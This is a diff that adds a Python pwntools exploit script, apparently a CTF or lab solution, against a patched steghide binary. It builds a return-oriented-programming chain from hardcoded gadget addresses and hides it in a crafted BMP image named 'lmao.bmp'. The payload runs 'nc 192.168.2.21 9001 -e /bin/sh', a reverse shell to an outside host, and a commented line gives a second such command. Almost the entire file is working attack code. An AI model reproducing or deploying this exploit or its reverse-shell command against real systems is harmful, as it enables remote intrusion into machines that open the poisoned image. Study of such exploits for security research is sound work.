@@ -1,0 +1,54 @@
+#!/usr/bin/python3
+from pwn import *
+# command = b"nc 172.17.0.4 9001 -e /bin/sh\0"
+command = b"nc 192.168.2.21 9001 -e /bin/sh\0"
+exe = ELF("./steghide_patched")
+gad1 =  0x0000000000406197 #pop r12, pop rbp
+gad2 = 0x000000000040c8b3 #: mov rsi, rax ; mov rdi, rbx ; call r12
+gad3 = 0x0000000000406196 #: pop rbx ; pop r12 ; pop rbp ; ret
+gad4 = 0x000000000042cd0c # pop rdx
+gad5 = 0x0000000000404a39 # pop rbp
+gad6 = 0x000000000040a392 # leave ret
+gad7 = 0x000000000040d3b8 #: mov rax, qword ptr [rax + 8] ; pop rbp ; ret
+dest = 0x48aab0 #rbx
+memcpy = 0x4043e0 #<memcpy@plt>
+base = 0x48a000
+pop_rax = 0x0000000000414d29 #: pop rax ; pop rbx ; pop rbp ; ret
+pop_rdi = 0x0000000000450e8b
+pop_rdx = gad4
+pop_rsi = 0x0000000000417f3e
+syscall = 0x00000000004066b3
+call_rax = 0x0000000000404010
+add_rax_rdx = 0x000000000042be68 #add rax, rdx ; jmp rax
+##########exploit###########
+target = open("target.bmp","rb")
+header = target.read(0x35)
+# target.seek(0x35)
+print(f"header: {header.hex()}")
+data = target.read(0xee-0x35)
+print(f"data: {data.hex()}")
+payload1 = p64(pop_rdi)
+payload1 +=p64(0x48ac68)
+payload1 += p64(pop_rdx)
+payload1 += p64(0x13e10)
+payload1 += p64(pop_rax)
+payload1 += p64(exe.got.gettext-8)+p64(0)+p64(0)
+payload1 += p64(gad7)+p64(0)
+payload1 +=p64(add_rax_rdx)
+payload1 = payload1.ljust(0x100,b"\0")
+payload1 += command 
+################################
+target.seek(len(payload1)+len(header)+len(data))
+data2 = header+data+payload1 + target.read(0x31fb6e-len(payload1)-len(header)-len(data))
+file = open("lmao.bmp","wb")
+file.write(data2)
+
+
+payload = p64(gad3)
+payload += p64(dest)+p64(memcpy)+p64(0)
+payload += p64(gad4)
+payload += p64(1359)
+payload += p64(gad2)
+payload += p64(gad5)+p64(dest-8)
+payload += p64(gad6)
+file.write(payload)
